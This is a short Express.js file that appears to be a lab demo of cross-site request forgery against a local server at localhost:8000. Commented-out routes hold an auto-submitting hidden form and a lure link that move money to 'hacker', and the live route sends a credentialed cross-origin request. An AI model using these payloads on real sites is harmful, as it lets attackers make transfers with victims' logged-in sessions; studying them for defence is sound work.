const express = require('express');
const parseurl = require('parseurl');

const app = express();

// app.get('/', function (req, res, next) {
//   res.send(`
//   <div>hello</div>
//    <form action="http://localhost:8000/csrf" method="post" target="hideIframe">
//     <input type="hidden" name="account" value="xiaoming" />
//     <input type="hidden" name="amount" value="10000" />
//     <input type="hidden" name="for" value="hacker" />
// </form>
// <iframe id="myIframe" name="hideIframe" style="display:none;"></iframe>
// <script> document.forms[0].submit(); </script>
//   `);
// });

// app.get('/', function (req, res, next) {
//   res.send(`
//     <a href="http://localhost:8000/csrf?amount=1000&for=hacker" taget="_blank">
//   重磅消息！！
//   <a/>
//   `);
// });

app.get('/', function (req, res, next) {
  res.send(`
  <script>
    var request = new XMLHttpRequest();
    request.onreadystatechange = function () { // 状态发生变化时，函数被回调
    if (request.readyState === 4) { // 成功完成
        // 判断响应结果:
        if (request.status === 200) {
            // 成功，通过responseText拿到响应的文本:
           console.log('ss',request.responseText);
        } else {
            // 失败，根据响应码判断失败原因:
            console.log('ff',request.status);
            console.log(request)
        }
    } else {
        // HTTP请求还在继续...
    }
}
    request.open('GET', 'http://localhost:8000/csrf');
    request.withCredentials = true;
    request.send();
  </script>
  `);
});
app.listen(8001, function () {
  console.log('listen on 8001');
});
